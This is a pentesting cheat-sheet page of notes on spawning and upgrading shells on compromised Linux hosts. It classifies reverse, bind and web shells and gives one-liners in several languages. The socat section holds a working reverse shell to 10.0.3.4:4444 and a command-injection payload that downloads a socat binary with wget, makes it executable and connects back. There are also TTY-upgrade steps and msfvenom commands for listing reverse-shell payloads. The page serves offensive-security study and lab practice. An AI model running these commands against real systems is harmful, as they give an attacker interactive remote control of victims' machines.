---
title: Spawn a shell
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - terminal
  - shells
---

# Spawn a shell


Webshell is a script written in a language that is executed by a server. Web shell are not fully interactive. 

??? note "Resources for upgrading simple shells"
    - [https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html](https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html).
    - [Cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
    - [Shell creation](https://rosettacode.org/wiki/Execute_a_system_command).
    - [About webshells](https://github.com/BlackArch/webshells).


Sidenote: Also, you can generate a webshell by using  msfvenom

## Clasification of shells

On a Linux system, the shell is a program that takes input from the user via the keyboard and passes these commands to the operating system to perform a specific function.

There are three main types of shell connections:

| **Shell Type** |  **Description** | 
| ----------- | -------------- |
| [Reverse shell](reverse-shells.md) |  Initiates a connection back to a "listener" on our attack box. | 
| [Bind shells](bind-shells.md) | "Binds" to a specific port on the target host and waits for a connection from our attack box. | 
| [Web shells](web-shells.md) | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a PHP script to run a single command. |


## Spawn a shell

### bash

```bash
# Upgrade shell with running these commands all at once:

SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
reset
xterm
```


```bash
bash -i

# Using echo
echo 'os.system('/bin/bash')'
```


### python

```bash
 # using python for a pseudo terminal
python -c 'import os; os.system("/bin/sh")'
```

```bash
 # using python for a pseudo terminal
python -c 'import pty; pty.spawn("/bin/bash")'

python3 -c "import pty;pty.spawn('/bin/bash')"
```

### ssh

```bash
/bin/sh -i
```


### perl

```bash
perl -e 'exec "/bin/sh";'

perl:  exec "/bin/sh";
```


### ruby

```bash
ruby:  exec "/bin/sh";
```


### lua

```bash
lua: os.execute(‘/bin/sh’)
```
  

### socat

```bash
# Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

If socat isn’t installed, there exists other options. There are standalone binaries that can be downloaded from this Github repo: [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

With a command injection vuln, it’s possible to download the correct architecture `socat` binary to a writable directoy, chmod it, then execute a reverse shell in one line:

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

On Kali, run:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

and you’ll catch a fully interactive TTY session. It supports tab-completion, SIGINT/SIGSTP support, vim, up arrow history, etc. It’s a full terminal. 

### stty options

```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'

# Ctrl-Z
 

# In Kali
$ stty raw -echo
$ fg
```
  
```bash
# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

### msfvenom

You can generate a webshell by using  msfvenom

```bash
# List payloads
msfvenom --list payloads | grep x64 | grep linux | grep reverse  
```

Also msfvenom can use metasploit payloads under “cmd/unix”  to generate one-liner bind or reverse shells. List options with:

```bash
msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
```
